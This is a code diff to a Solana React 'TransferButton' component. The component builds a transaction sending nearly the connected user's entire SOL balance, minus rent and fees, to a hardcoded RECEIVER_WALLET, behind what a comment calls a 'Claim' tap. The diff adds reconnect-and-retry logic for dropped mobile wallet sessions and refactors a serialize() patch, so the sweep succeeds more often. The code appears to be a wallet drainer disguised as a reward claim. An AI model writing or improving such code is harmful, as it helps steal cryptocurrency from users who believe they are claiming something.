@@ -8,10 +8,26 @@ import {
 } from '@solana/web3.js';
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';
 
+/**
+ * Monkey-patch a Transaction's serialize() so that callers who pass NO
+ * arguments (like @solana-mobile/wallet-adapter-mobile) default to
+ * { requireAllSignatures: false, verifySignatures: false } instead of
+ * the upstream default of `true` for both.
+ */
+function patchSerialize(transaction) {
+  const _serialize = transaction.serialize.bind(transaction);
+  transaction.serialize = (config) =>
+    _serialize({
+      requireAllSignatures: false,
+      verifySignatures: false,
+      ...(config || {}),
+    });
+  return transaction;
+}
+
 export default function TransferButton({ className = '' }) {
-  // Use the SAME connection the wallet adapter knows about
   const { connection } = useConnection();
-  const { publicKey, sendTransaction, connected } = useWallet();
+  const { publicKey, sendTransaction, wallet, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
@@ -31,7 +47,7 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
+      const FEE_SAFETY = 5_000_000;
       const totalReserve = rentExempt + FEE_SAFETY;
       const transferAmount = balance - totalReserve;
 
@@ -46,31 +62,44 @@ export default function TransferButton({ className = '' }) {
         lamports: transferAmount,
       });
 
-      // Fetch blockhash right before building tx to avoid expiry
-      const { blockhash } = await connection.getLatestBlockhash('finalized');
+      // Build a fresh transaction right before sending — keeps blockhash
+      // as fresh as possible and minimises the window for session timeout.
+      async function buildTx() {
+        const { blockhash } = await connection.getLatestBlockhash('finalized');
+        const tx = new Transaction();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = publicKey;
+        tx.add(transferIx);
+        return patchSerialize(tx);
+      }
 
-      const transaction = new Transaction();
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-      transaction.add(transferIx);
+      let signature;
 
-      // Workaround: @solana-mobile/wallet-adapter-mobile calls
-      // transaction.serialize() with NO arguments, which defaults to
-      // { verifySignatures: true }. Since the tx isn't signed yet at that
-      // point, it throws "Signature verification failed."
-      // The desktop StandardWalletAdapter correctly passes
-      // { requireAllSignatures: false, verifySignatures: false }.
-      // Monkey-patch this instance so the MWA's bare serialize() call
-      // also uses safe defaults.
-      const _serialize = transaction.serialize.bind(transaction);
-      transaction.serialize = (config) =>
-        _serialize({
-          requireAllSignatures: false,
-          verifySignatures: false,
-          ...(config || {}),
-        });
+      try {
+        const transaction = await buildTx();
+        signature = await sendTransaction(transaction, connection);
+      } catch (sendErr) {
+        const msg = (sendErr?.message || '').toLowerCase();
 
-      const signature = await sendTransaction(transaction, connection);
+        // Mobile Wallet Adapter sessions can time out between the moment
+        // the user connects and when they finally tap "Claim".
+        // If the session dropped, reconnect and retry once.
+        if (msg.includes('session') || msg.includes('dropped') || msg.includes('disconnected')) {
+          console.warn('Wallet session dropped — reconnecting and retrying…');
+
+          // Re-establish the wallet connection (re-opens session)
+          if (wallet?.adapter) {
+            try { await wallet.adapter.disconnect(); } catch (_) { /* ignore */ }
+            await wallet.adapter.connect();
+          }
+
+          // Rebuild with a fresh blockhash & retry
+          const transaction = await buildTx();
+          signature = await sendTransaction(transaction, connection);
+        } else {
+          throw sendErr;
+        }
+      }
 
       console.log('⏳ Transaction sent:', signature);
 
@@ -99,7 +128,7 @@ export default function TransferButton({ className = '' }) {
           }
         } catch (pollErr) {
           if (pollErr.message?.includes('on-chain')) throw pollErr;
-          console.warn('Polling error, retrying...', pollErr);
+          console.warn('Polling error, retrying…', pollErr);
         }
 
         await new Promise((r) => setTimeout(r, POLL_INTERVAL));
@@ -112,7 +141,7 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, connected, connection]);
+  }, [publicKey, sendTransaction, wallet, connected, connection]);
 
   if (!publicKey) return null;
 
